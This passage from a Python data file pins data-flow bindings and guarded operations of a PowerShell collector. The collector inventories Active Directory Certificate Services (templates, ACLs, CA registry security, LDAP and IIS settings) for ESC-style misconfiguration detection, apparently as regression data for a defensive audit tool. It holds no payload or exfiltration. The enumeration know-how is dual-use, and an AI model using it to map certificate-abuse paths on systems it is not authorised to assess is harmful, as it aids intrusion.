        (
            "assign Equals",
            "[ordered]@{ complete = $complete; count = $(if ($rows -ge 0) { $rows } else { $written }) }",
        ),
        ("index Equals", "$m['reason'] = ($why -join '; ')"),
    ],
    # condition $written -ne $returned -or $failures.Count
    "_searchmarker::returned": [
        ("arg", "$returned"),
        ("arg", "$webEndpoints.Count"),
        ("parameter", "[int]$returned"),
    ],
    # condition $rows -ge 0
    "_searchmarker::rows": [
        ("arg", "$rows"),
        ("parameter", "[int]$rows = -1"),
    ],
    # condition -not $searched
    "_searchmarker::searched": [
        ("arg", "($endpointsComplete -and -not $endpointScope)"),
        ("arg", "([bool]$search.complete)"),
        ("parameter", "[bool]$searched"),
    ],
    # parameter of _searchMarker, called by a binding of $<script>::enumeration
    "_searchmarker::searchreason": [
        ("arg", "$endpointsWhy"),
        ("arg", "([string]$search.reason)"),
        ("parameter", "[string]$searchReason"),
    ],
    # read by a binding of $_searchmarker::m
    "_searchmarker::why": [
        ("assign Equals", "@()"),
        ("assign PlusEquals", "$detail"),
        ("assign PlusEquals", "$searchReason"),
    ],
    # condition $written -ne $returned -or $failures.Count
    "_searchmarker::written": [
        ("arg", "$webEndpoints.Count"),
        ("arg", "$written"),
        ("parameter", "[int]$written"),
    ],
    # argument of .ToInt64(): [Convert]::ToInt64(('{0:x2}{1:x2}{2:x2}{3:x2}{4:x2}{5:x2}' -f $b[2], $b[3], $b[4], $b[5], $b[6], $b[7]), 16)
    "_sidstring::b": [
        ("assign Equals", "[byte[]]@($values)[0]"),
    ],
    # argument of .ToInt64(): [Convert]::ToInt64(('{0:x2}{1:x2}{2:x2}{3:x2}' -f $b[$i + 3], $b[$i + 2], $b[$i + 1], $b[$i]), 16)
    "_sidstring::i": [
        ("assign Equals", "8"),
        ("assign PlusEquals", "4"),
    ],
    # condition @($values).Count -ne 1 -or -not (@($values)[0] -is [byte[]])
    "_sidstring::values": [
        ("arg", "@(_v $hits[0] 'objectsid')"),
        ("parameter", "$values"),
    ],
    # input of $read: & $read
    "_tryread::read": [
        (
            "arg",
            "{ $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey( \"SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\$caName\") if ($key) { $key.GetValue('Security') } else { $null } }",
        ),
        (
            "arg",
            '{ Get-WebConfigurationProperty -PSPath $ps -Filter "$auth/providers" -Name Collection -ErrorAction Stop }',
        ),
        (
            "arg",
            "{ Get-WebConfigurationProperty -PSPath $ps -Filter $auth -Name 'extendedProtection.tokenChecking' -ErrorAction Stop }",
        ),
        (
            "arg",
            "{ Get-WebConfigurationProperty -PSPath $ps -Filter $auth -Name enabled -ErrorAction Stop }",
        ),
        (
            "arg",
            "{ Get-WebConfigurationProperty -PSPath $ps -Filter 'system.webServer/security/access' -Name sslFlags -ErrorAction Stop }",
        ),
        ("parameter", "[scriptblock]$read"),
    ],
    # argument of .ContainsKey(): $p.ContainsKey($name)
    "_v::name": [
        ("arg", "$attr"),
        ("arg", "'altsecurityidentities'"),
        ("arg", "'cacertificate'"),
        ("arg", "'certificaterevocationlist'"),
        ("arg", "'certificaterevocationlist'"),
        ("arg", "'certificatetemplates'"),
        ("arg", "'cn'"),
        ("arg", "'cn'"),
        ("arg", "'cn'"),
        ("arg", "'cn'"),
        ("arg", "'configurationnamingcontext'"),
        ("arg", "'defaultnamingcontext'"),
        ("arg", "'displayname'"),
        ("arg", "'displayname'"),
        ("arg", "'distinguishedname'"),
        ("arg", "'distinguishedname'"),
        ("arg", "'distinguishedname'"),
        ("arg", "'distinguishedname'"),
        ("arg", "'distinguishedname'"),
        ("arg", "'dnshostname'"),
        ("arg", "'dnshostname'"),
        ("arg", "'dnshostname'"),
        ("arg", "'dnshostname'"),
        ("arg", "'dnshostname'"),
        ("arg", "'msds-oidtogrouplink'"),
        ("arg", "'msds-oidtogrouplink'"),
        ("arg", "'mspki-cert-template-oid'"),
        ("arg", "'mspki-cert-template-oid'"),
        ("arg", "'mspki-certificate-name-flag'"),
        ("arg", "'mspki-certificate-name-flag'"),
        ("arg", "'mspki-certificate-policy'"),
        ("arg", "'mspki-enrollment-flag'"),
        ("arg", "'mspki-enrollment-flag'"),
        ("arg", "'mspki-minimal-key-size'"),
        ("arg", "'mspki-minimal-key-size'"),
        ("arg", "'mspki-template-schema-version'"),
        ("arg", "'mspki-template-schema-version'"),
        ("arg", "'ntsecuritydescriptor'"),
        ("arg", "'ntsecuritydescriptor'"),
        ("arg", "'objectguid'"),
        ("arg", "'objectguid'"),
        ("arg", "'objectguid'"),
        ("arg", "'objectguid'"),
        ("arg", "'objectguid'"),
        ("arg", "'objectguid'"),
        ("arg", "'objectguid'"),
        ("arg", "'objectguid'"),
        ("arg", "'objectsid'"),
        ("arg", "'pkicsp'"),
        ("arg", "'pkiextendedkeyusage'"),
        ("parameter", "[string]$name"),
    ],
    # receiver of .ContainsKey()
    "_v::p": [
        ("arg", "$hits[0]"),
        ("arg", "$hp"),
        ("arg", "$hp"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("arg", "$p"),
        ("parameter", "$p"),
    ],
    # condition $null -eq $result
    "_wmidwordstatus::result": [
        ("arg", "$kdc"),
        ("arg", "$sch"),
        ("parameter", "$result"),
    ],
    # input of WriteAllText: [IO.File]::WriteAllText($outPath, $script:JS.Serialize($obj), (New-Object Text.UTF8Encoding($false)))
    "_writejson::obj": [
        ("arg", "$caSecurity"),
        ("arg", "$enrollmentServices"),
        ("arg", "$manifest"),
        ("arg", "([ordered]@{ certs = @($certIndex); crls = @($crlIndex) })"),
        ("arg", "@($caConfig)"),
        ("arg", "@($dcConfigs)"),
        ("arg", "@($oids)"),
        ("arg", "@($pkiAcls)"),
        ("arg", "@($principalMappings)"),
        ("arg", "@($templates)"),
        ("arg", "@($webEndpoints)"),
        ("parameter", "$obj"),
    ],
    # input of Join-Path: Join-Path $OutDir $outName
    "_writejson::outname": [
        ("arg", "'ca-config.json'"),
        ("arg", "'ca-security.json'"),
        ("arg", "'certs/index.json'"),
        ("arg", "'collector-manifest.json'"),
        ("arg", "'dc-config.json'"),
        ("arg", "'enrollment-services.json'"),
        ("arg", "'oid-objects.json'"),
        ("arg", "'pki-acls.json'"),
        ("arg", "'principal-mappings.json'"),
        ("arg", "'templates.json'"),
        ("arg", "'web-endpoints.json'"),
        ("parameter", "[string]$outName"),
    ],
    # input of Assert-AdcsOutputPath: Assert-AdcsOutputPath $outParent
    "_writejson::outparent": [
        ("assign Equals", "Split-Path $outPath -Parent"),
    ],
    # input of Split-Path: Split-Path $outPath -Parent
    "_writejson::outpath": [
        ("assign Equals", "Join-Path $OutDir $outName"),
    ],
    # argument of .GetDirectoryName(): [IO.Path]::GetDirectoryName($cur)
    "assert-adcsoutputpath::cur": [
        ("assign Equals", "$full"),
        ("assign Equals", "[IO.Path]::GetDirectoryName($cur)"),
    ],
    # receiver of .Equals()
    "assert-adcsoutputpath::full": [
        ("assign Equals", "[IO.Path]::GetFullPath($path).TrimEnd([char]'\\', [char]'/')"),
    ],
    # condition -not $inside
    "assert-adcsoutputpath::inside": [
        (
            "assign Equals",
            "$full.Equals($root, [StringComparison]::OrdinalIgnoreCase) -or $full.StartsWith($root + [IO.Path]::DirectorySeparatorChar, [StringComparison]::OrdinalIgnoreCase) -or $full.StartsWith($root + [IO.Path]::AltDirectorySeparatorChar, [StringComparison]::OrdinalIgnoreCase)",
        ),
    ],
    # argument of .GetFullPath(): [IO.Path]::GetFullPath($path)
    "assert-adcsoutputpath::path": [
        ("arg", "$OutDir"),
        ("arg", "$certDir"),
        ("arg", "$outParent"),
        ("arg", "$outPath"),
        ("arg", "(Join-Path $certDir $certFile)"),
        ("arg", "(Join-Path $certDir $crlFile)"),
        ("parameter", "[string]$path"),
    ],
    # argument of .Equals(): $full.Equals($root, [StringComparison]::OrdinalIgnoreCase)
    "assert-adcsoutputpath::root": [
        ("assign Equals", "[IO.Path]::GetFullPath($OutDir).TrimEnd([char]'\\', [char]'/')"),
    ],
}

# The pinned write/exec/remote operations with their control-flow context, as a
# multiset of (normalized text, context outermost-first).
GUARDED_OPS: tuple[tuple[str, tuple[str, ...]], ...] = (
    (
        "ForEach-Object { $_.ToString('x2') }",
        (
            "function _guidHex",
            "guard if (-not $values -or $values.Count -lt 1) -> return",
            "guard if ($b.Count -ne 16) -> return",
        ),
    ),
    ("Join-Path $OutDir $outName", ("function _writeJson",)),
    ("Split-Path $outPath -Parent", ("function _writeJson",)),
    ("Assert-AdcsOutputPath $outParent", ("function _writeJson",)),
    (
        "Assert-AdcsOutputPath $outPath",
        ("function _writeJson", "guard Assert-AdcsOutputPath $outParent"),
    ),
    (
        "Test-Path $outParent",
        (
            "function _writeJson",
            "guard Assert-AdcsOutputPath $outParent",
            "guard Assert-AdcsOutputPath $outPath",
            "if-condition after []",
        ),
    ),
    (
        "New-Item -ItemType Directory -Force -Path $outParent",
        (
            "function _writeJson",
            "guard Assert-AdcsOutputPath $outParent",
            "guard Assert-AdcsOutputPath $outPath",
            "if (-not (Test-Path $outParent)) after []",
        ),
    ),
    (
        "Out-Null",
        (
            "function _writeJson",
            "guard Assert-AdcsOutputPath $outParent",
            "guard Assert-AdcsOutputPath $outPath",
            "if (-not (Test-Path $outParent)) after []",
        ),
    ),
    (
        "New-Object Text.UTF8Encoding($false)",
        (
            "function _writeJson",
            "guard Assert-AdcsOutputPath $outParent",
            "guard Assert-AdcsOutputPath $outPath",
        ),
    ),
    ("New-Object System.Collections.ArrayList", ("function _pagedSearchCore",)),
    (
        "& $send $cookie",
        ("function _pagedSearchCore", "for ($page = 0; $page -lt $maxPages; $page++)", "try"),
    ),
    (
        "Where-Object { $null -ne $_ -and $_.PSObject.Properties['Cookie'] }",
        (
            "function _pagedSearchCore",
            "for ($page = 0; $page -lt $maxPages; $page++)",
            "guard if ($null -eq $resp) -> break",
            "guard if ([string]$resp.ResultCode -ne 'Success') -> break",
        ),
    ),
    (
        "Select-Object -First 1",
        (
            "function _pagedSearchCore",
            "for ($page = 0; $page -lt $maxPages; $page++)",
            "guard if ($null -eq $resp) -> break",
            "guard if ([string]$resp.ResultCode -ne 'Success') -> break",
        ),
    ),
    ("& $send $null", ("function _baseSearchCore", "try")),
    (
        "Add-Type -AssemblyName System.DirectoryServices.Protocols",
        ("function _ldapConnection", "guard if ($script:LdapConn) -> return"),
    ),
    (
        "New-Object System.Net.NetworkCredential($LdapUser, $LdapPass)",
        (
            "function _ldapConnection",
            "guard if ($script:LdapConn) -> return",
            "if ($LdapUser) after []",
        ),
    ),
    ("_ldapConnection", ("function _search",)),
    ("_baseSearchCore $send", ("function _search", "if ($Scope -eq 'Base') after []")),
    ("_pagedSearchCore $send", ("function _search", "guard if ($Scope -eq 'Base') -> return")),
    (
        "_search '' '(objectClass=*)' @('configurationNamingContext', 'defaultNamingContext') -Scope Base",
        ("function _rootDse", "guard if ($script:RootDse) -> return"),
    ),
    (
        "_entryProps $r.entries[0]",
        (
            "function _rootDse",
            "guard if ($script:RootDse) -> return",
            "guard if (-not $r.complete -or $r.entries.Count -ne 1) -> throw",
        ),
    ),
    (
        "_v $p 'configurationnamingcontext'",
        (
            "function _rootDse",
            "guard if ($script:RootDse) -> return",
            "guard if (-not $r.complete -or $r.entries.Count -ne 1) -> throw",
        ),
    ),
    (
        "_v $p 'defaultnamingcontext'",
        (
            "function _rootDse",
            "guard if ($script:RootDse) -> return",
            "guard if (-not $r.complete -or $r.entries.Count -ne 1) -> throw",
        ),
    ),
    (
        'ConvertFrom-Json @\' { "enrollment-services": { "distinguishedname": {"type": "string", "need": "required", "field": "(identity)"}, "cn": {"type": "string", "need": "required", "field": "name"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "dnshostname": {"type": "string", "need": "optional", "field": "dns"}, "certificatetemplates": {"type": "strings", "need": "optional", "field": "(source of template.published_by)"} }, "templates": { "distinguishedname": {"type": "string", "need": "required", "field": "(identity)"}, "cn": {"type": "string", "need": "required", "field": "name"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "mspki-cert-template-oid": {"type": "string", "need": "required", "field": "oid"}, "displayname": {"type": "string", "need": "optional", "field": "display_name"}, "mspki-certificate-name-flag": {"type": "int", "need": "optional", "field": "name_flags"}, "mspki-enrollment-flag": {"type": "int", "need": "optional", "field": "enrollment_flags"}, "pkiextendedkeyusage": {"type": "strings", "need": "optional", "field": "ekus"}, "mspki-certificate-policy": {"type": "strings", "need": "optional", "field": "issuance_policy_oids"}, "pkicsp": {"type": "strings", "need": "optional", "field": "csp"}, "mspki-template-schema-version": {"type": "int", "need": "optional", "field": "schema_version"}, "mspki-minimal-key-size": {"type": "int", "need": "optional", "field": "min_key_size"}, "ntsecuritydescriptor": {"type": "bytes", "need": "sd", "field": "security"} }, "oid-objects": { "distinguishedname": {"type": "string", "need": "required", "field": "(identity)"}, "mspki-cert-template-oid": {"type": "string", "need": "required", "field": "oid"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "displayname": {"type": "string", "need": "optional", "field": "name"}, "msds-oidtogrouplink": {"type": "string", "need": "optional", "field": "group_link"} }, "pki-acls": { "distinguishedname": {"type": "string", "need": "required", "field": "object_dn"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "dnshostname": {"type": "string", "need": "optional", "field": "(source of pki.ca_host_sid)"}, "ntsecuritydescriptor": {"type": "bytes", "need": "sd", "field": "security"} }, "certs": { "distinguishedname": {"type": "string", "need": "required", "field": "(identity)"}, "cn": {"type": "string", "need": "required", "field": "ca_name"}, "cacertificate": {"type": "bytes", "need": "optional", "field": "(certificate)"} }, "crls": { "distinguishedname": {"type": "string", "need": "required", "field": "source"}, "cn": {"type": "string", "need": "required", "field": "ca_name"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "certificaterevocationlist": {"type": "bytes", "need": "optional", "field": "(crl)"} }, "principal-mappings": { "distinguishedname": {"type": "string", "need": "required", "field": "dn"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "altsecurityidentities": {"type": "strings", "need": "required", "field": "mappings"} }, "dc-config": { "distinguishedname": {"type": "string", "need": "required", "field": "(identity)"}, "objectguid": {"type": "guid", "need": "required", "field": "object_guid"}, "dnshostname": {"type": "string", "need": "placeholder", "field": "name"} } } \'@',
        (),
    ),
    (
        'ConvertFrom-Json @\' { "crl.tier": { "by": "ingest", "from": ["certs.kind"], "containers": ["certs"], "join": "the CRL\'s CDP cn = the AIA object\'s cn", "miss": "null" }, "endpoint.transports": { "by": "collector", "from": ["IIS site bindings"], "containers": ["web-endpoints"], "join": "the application\'s site", "miss": "null" }, "template.published_by": { "by": "ingest", "from": ["enrollment-services.certificatetemplates"], "containers": ["enrollment-services"], "join": "template cn, exactly ($JOINS publication)", "miss": "unpublished only when enrollment-services is complete", "text": "ESC1-3 and ESC15 publication detail says the list is incomplete when it is" }, "pki.ca_host_sid": { "by": "collector", "from": ["the CA host\'s computer object objectSid (domain NC)"], "containers": [], "join": "the enrollment service\'s dNSHostName = the computer object\'s dNSHostName ($JOINS ca-host)", "miss": "null (not obtained): ESC5 cannot tell the CA host\'s own grant apart and is undecided" }, "cert.ca_kind": { "by": "ingest", "from": ["ca.kind"], "containers": ["ca-config"], "join": "certs/index.json ca_name = CA name", "miss": "null (unattached certificate)" } } \'@',
        (),
    ),
    (
        'ConvertFrom-Json @\' { "publication": { "field": "template.published_by", "by": "ingest", "impl": "resolve_join", "from": "enrollment-services.certificatetemplates", "to": "templates", "keys": ["cn"], "legacy_keys": ["cn", "oid"], "compare": "identical (MS-WCCE)", "none": "attaches nowhere (a published template that is not in AD)", "ambiguous": "published_by not obtained for every template it is identical or folds to" }, "cert-ca": { "field": "cert.ca_kind", "by": "ingest", "impl": "resolve_join", "from": "certs.ca_name", "to": "ca-config", "keys": ["cn"], "compare": "identical (both are cn values the collector copied)", "none": "unattached: ca_kind not obtained", "ambiguous": "unattached: ca_kind not obtained (two CA rows folding together is an ingest error)" }, "crl-tier": { "field": "crl.tier", "by": "ingest", "impl": "resolve_join", "from": "crls.ca_name (the CDP object\'s cn)", "to": "certs (certs/index.json ca_name)", "keys": ["ca_name"], "compare": "identical", "none": "tier null", "ambiguous": "tier null (also when one cn\'s certificates disagree on kind)" }, "ca-security": { "field": "ca.security", "by": "ingest", "impl": "exact set", "from": "ca-security.json keys", "to": "ca-config", "keys": ["cn"], "compare": "identical (the collector writes the row\'s name)", "none": "ingest error: an entry naming no CA, or a CA without an entry", "ambiguous": "ingest error: two CA rows whose names fold together" }, "publisher-ca": { "field": "ca.enrollment_service", "by": "ingest", "impl": "exact set", "from": "enrollment-services.json keys", "to": "ca-config", "keys": ["cn"], "compare": "identical (the collector writes the row\'s name)", "none": "ingest error: a publisher without a CA row, or the reverse", "ambiguous": "ingest error: two CA rows whose names fold together" }, "oid-link": { "field": "oid.group_link", "by": "detection (ESC13)", "impl": "resolve_join", "from": "templates.issuance_policy_oids", "to": "oid-objects", "keys": ["oid"], "compare": "identical", "none": "no link: decided only when oid-objects is complete", "ambiguous": "ESC13 undecided (duplicate OIDs also mark oid-objects incomplete)" }, "local-ca": { "field": "ca.edit_flags", "by": "collector", "impl": "-ceq", "from": "enrollment-services.cn", "to": "certutil CA\\\\CommonName", "keys": ["cn"], "compare": "identical (-ceq)", "none": "a remote CA: every registry field null (also for a CA whose AD name is sanitized)", "ambiguous": "ingest error: the local CA\'s standalone row and the enrollment service fold together" }, "ca-host": { "field": "pki.ca_host_sid", "by": "collector", "impl": "-ceq", "from": "enrollment-services dnshostname (the pki-acls row of the enrollment service)", "to": "computer objects in the domain NC", "keys": ["dnshostname"], "compare": "identical (-ceq) on the returned dNSHostName (the LDAP filter only narrows the search)", "none": "ca_host_sid null (not obtained), e.g. the CA host is in another domain", "ambiguous": "ca_host_sid null (not obtained): two computer objects answer, or only one that differs in case" }, "app-site": { "field": "endpoint.transports", "by": "collector", "impl": "parent object", "from": "IIS application", "to": "its IIS site", "keys": ["(parent object)"], "compare": "enumerated under the site", "none": "transports null when the site\'s bindings read nothing", "ambiguous": "impossible: each application is enumerated under one site" } } \'@',
        (),
    ),
    (
        "_v $p $attr",
        (
            "function _schemaCheck",
            "guard if ($null -eq $spec) -> throw",
            "foreach ($prop in $spec.PSObject.Properties)",
            "guard if ($rule.need -eq 'sd') -> continue",
        ),
    ),
    ("_schemaCheck $p $OBJECT_SCHEMA.$container", ("function _requireSchema",)),
    ("_v $p 'distinguishedname'", ("function _requireSchema", "if ($check.fatal) after []")),
    ("Where-Object { $_ }", ("function _searchMarker",)),
    (
        "ForEach-Object { [string]$_ }",
        ("function _certutilStatus", "guard if ($exitCode -eq 0) -> return"),
    ),
    (
        "_certutilStatus $lines $exitCode",
        ("function _certutilFlagsFrom", "switch (_certutilStatus $lines $exitCode)"),
    ),
    ("_parseCertutilDwordLines $lines", ("function _certutilFlagsFrom", "if-condition after []")),
    (
        "_parseCertutilFlagLines $lines",
        (
            "function _certutilFlagsFrom",
            "guard if ($null -eq (_parseCertutilDwordLines $lines)) -> return",
        ),
    ),
    ("_certutilStatus $lines $exitCode", ("function _certutilDwordFrom", "if-condition after []")),
    (
        "_parseCertutilDwordLines $lines",
        (
            "function _certutilDwordFrom",
            "guard if ((_certutilStatus $lines $exitCode) -ne 'ok') -> return",
        ),
    ),
    ("_certutilStatus $lines $exitCode", ("function _auditFilterFrom", "if-condition after []")),
    (
        "_certutilDwordFrom $lines $exitCode",
        (
            "function _auditFilterFrom",
            "guard if ((_certutilStatus $lines $exitCode) -eq 'absent') -> return",
        ),
    ),
    (
        "_certutilStatus $lines $exitCode",
        ("function _certutilMultiSzFrom", "switch (_certutilStatus $lines $exitCode)"),
    ),
    ("_parseCertutilMultiSzLines $lines", ("function _certutilMultiSzFrom",)),
    ("_certutilStatus $lines $exitCode", ("function _certutilStringFrom",)),
    (
        'Where-Object { [string]$_ -match "$name REG_SZ = (.+)" }',
        ("function _certutilStringFrom", "if ($status -eq 'ok') after []"),
    ),
    (
        "ForEach-Object { $Matches[1].Trim() }",
        ("function _certutilStringFrom", "if ($status -eq 'ok') after []"),
    ),
    ("Select-Object -First 1", ("function _certutilStringFrom", "if ($status -eq 'ok') after []")),
    ("& $read", ("function _tryRead", "try")),
    (
        "New-Object Security.Cryptography.X509Certificates.X509Certificate2(,$der)",
        (
            "function _certKindFromDer",
            "guard if (-not $der -or $der.Length -eq 0) -> return",
            "try",
        ),
    ),
    (
        "New-Object DirectoryServices.ActiveDirectorySecurity",
        ("function _parseAces", "guard if (-not $sdBytes -or $sdBytes.Length -eq 0) -> return"),
    ),
    (
        "_parseAces ([byte[]]$sdBytes)",
        ("function _sdRead", "guard if (-not $sdBytes -or $sdBytes.Length -eq 0) -> return", "try"),
    ),
    (
        "_readOwner ([byte[]]$sdBytes)",
        ("function _sdRead", "guard if (-not $sdBytes -or $sdBytes.Length -eq 0) -> return"),
    ),
    ("_sdRead (@(_v $p 'ntsecuritydescriptor')[0])", ("function _aclRow",)),
    ("_v $p 'ntsecuritydescriptor'", ("function _aclRow",)),
    ("_v $p 'distinguishedname'", ("function _aclRow",)),
    ("_guidHex @(_v $p 'objectguid')", ("function _aclRow",)),
    ("_v $p 'objectguid'", ("function _aclRow",)),
    (
        "_search (_rootDse).domain \"(&(objectCategory=computer)(dNSHostName=$(_ldapEscape $dns)))\" @('objectsid', 'dnshostname')",
        ("function _caHostSid", "guard if (@($dnsValues).Count -ne 1) -> return"),
    ),
    ("_rootDse", ("function _caHostSid", "guard if (@($dnsValues).Count -ne 1) -> return")),
    ("_ldapEscape $dns", ("function _caHostSid", "guard if (@($dnsValues).Count -ne 1) -> return")),
    (
        "_entryProps $e",
        (
            "function _caHostSid",
            "guard if (@($dnsValues).Count -ne 1) -> return",
            "guard if (-not $r.complete -or @($r.entries).Count -ne 1) -> return",
            "foreach ($e in $r.entries)",
        ),
    ),
    (
        "_v $hp 'dnshostname'",
        (
            "function _caHostSid",
            "guard if (@($dnsValues).Count -ne 1) -> return",
            "guard if (-not $r.complete -or @($r.entries).Count -ne 1) -> return",
            "foreach ($e in $r.entries)",
            "if-condition after []",
        ),
    ),
    (
        "_v $hp 'dnshostname'",
        (
            "function _caHostSid",
            "guard if (@($dnsValues).Count -ne 1) -> return",
            "guard if (-not $r.complete -or @($r.entries).Count -ne 1) -> return",
            "foreach ($e in $r.entries)",
            "if-condition after []",
        ),
    ),
    (
        "_sidString @(_v $hits[0] 'objectsid')",
        (
            "function _caHostSid",
            "guard if (@($dnsValues).Count -ne 1) -> return",
            "guard if (-not $r.complete -or @($r.entries).Count -ne 1) -> return",
            "guard if ($hits.Count -ne 1) -> return",
        ),
    ),
    (
        "_v $hits[0] 'objectsid'",
        (
            "function _caHostSid",
            "guard if (@($dnsValues).Count -ne 1) -> return",
            "guard if (-not $r.complete -or @($r.entries).Count -ne 1) -> return",
            "guard if ($hits.Count -ne 1) -> return",
        ),
    ),
    (
        "_search $dn '(objectClass=*)' @('ntsecuritydescriptor', 'objectguid') -Scope Base -Sd",
        ("function _objAcl",),
    ),
    (
        "_entryProps $r.entries[0]",
        ("function _objAcl", "guard if (-not $r.complete -or $r.entries.Count -ne 1) -> return"),
    ),
    (
        "_schemaCheck $p $OBJECT_SCHEMA.'pki-acls'",
        (
            "function _objAcl",
            "guard if (-not $r.complete -or $r.entries.Count -ne 1) -> return",
            "if-condition after []",
        ),
    ),
    (
        "_aclRow $p $kind '' $false",
        (
            "function _objAcl",
            "guard if (-not $r.complete -or $r.entries.Count -ne 1) -> return",
            "guard if ((_schemaCheck $p $OBJECT_SCHEMA.'pki-acls').fatal) -> return",
        ),
    ),
    ("_search $containerDn $filter $attrs -Sd", ("function _childAcls",)),
    ("_entryProps $e", ("function _childAcls", "foreach ($e in $r.entries)", "try")),
    ("_requireSchema $p 'pki-acls'", ("function _childAcls", "foreach ($e in $r.entries)", "try")),
    (
        "_caHostSid @(_v $p 'dnshostname')",
        ("function _childAcls", "foreach ($e in $r.entries)", "try", "if ($CaHost) after []"),
    ),
    (
        "_v $p 'dnshostname'",
        ("function _childAcls", "foreach ($e in $r.entries)", "try", "if ($CaHost) after []"),
    ),
    (
        "_aclRow $p $kind $hostSid ([bool]$CaHost)",
        ("function _childAcls", "foreach ($e in $r.entries)", "try"),
    ),
    (
        "New-Object DirectoryServices.ActiveDirectorySecurity",
        (
            "function _readOwner",
            "guard if (-not $sdBytes -or $sdBytes.Length -eq 0) -> return",
            "try",
        ),
    ),
    (
        "New-Object Security.AccessControl.RawSecurityDescriptor(@([byte[]]$bytes), 0)",
        (
            "function _caSecurityFromBytes",
            "guard if (-not $bytes -or $bytes.Length -eq 0) -> return",
            "try",
        ),
    ),
    ("_caSecurityFromBytes $bytes", ("function _rawSdOwner",)),
    (
        "_tryRead { $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey( \"SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\$caName\") if ($key) { $key.GetValue('Security') } else { $null } }",
        ("function _caSecurityRead",),
    ),
    (
        "_caSecurityFromBytes $r.value",
        ("function _caSecurityRead", "guard if (-not $r.ok) -> return"),
    ),
    ("& certutil -getreg $regpath 2>&1", ("function _certutilRead", "try")),
    ("ForEach-Object { [string]$_ }", ("function _certutilRead", "try")),
    ("_certutilRead $regpath", ("function _certutilFlags",)),
    ("_certutilFlagsFrom $r.lines $r.code", ("function _certutilFlags",)),
    ("_certutilRead $regpath", ("function _certutilDword",)),
    ("_certutilDwordFrom $r.lines $r.code", ("function _certutilDword",)),
    ("_certutilRead $regpath", ("function _certutilMultiSz",)),
    ("_certutilMultiSzFrom $r.lines $r.code", ("function _certutilMultiSz",)),
    (
        "_b64 $LdapUserB64",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "if ($LdapUserB64 -or $LdapPassB64) after []",
            "guard if (-not ($LdapUserB64 -and $LdapPassB64)) -> throw",
        ),
    ),
    (
        "_b64 $LdapPassB64",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "if ($LdapUserB64 -or $LdapPassB64) after []",
            "guard if (-not ($LdapUserB64 -and $LdapPassB64)) -> throw",
        ),
    ),
    (
        'Write-Host "Using explicit LDAP credentials ($LdapUser)"',
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "if ($LdapUser) after []",
        ),
    ),
    (
        'Write-Host "Using integrated auth (current user) for LDAP"',
        ("guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return", "else of [($LdapUser)]"),
    ),
    (
        "_b64 $DcRegistryUserB64",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "if ($CollectDcMapping -and ($DcRegistryUserB64 -or $DcRegistryPassB64)) after []",
            "guard if (-not ($DcRegistryUserB64 -and $DcRegistryPassB64)) -> throw",
        ),
    ),
    (
        "_b64 $DcRegistryPassB64",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "if ($CollectDcMapping -and ($DcRegistryUserB64 -or $DcRegistryPassB64)) after []",
            "guard if (-not ($DcRegistryUserB64 -and $DcRegistryPassB64)) -> throw",
        ),
    ),
    (
        "Assert-AdcsOutputPath $OutDir",
        ("guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",),
    ),
    (
        "New-Item -ItemType Directory -Force -Path $OutDir",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "Out-Null",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "Add-Type -AssemblyName System.Web.Extensions",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "New-Object System.Web.Script.Serialization.JavaScriptSerializer",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_searchMarker ([bool]$search.complete) ([string]$search.reason) $returned $written $failures $rows",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
            "function _markSearch",
        ),
    ),
    (
        "_certutilRead 'CA\\CommonName'",
        (
            "guard if ($PSCmdlet.ParameterSetName -eq 'SelfTest') -> return",
            "guard Assert-AdcsOutputPath $OutDir",
        ),
    ),
    (
        "_certutilStringFrom $cnRead.lines $cnRead.code 'CommonName'",
        (
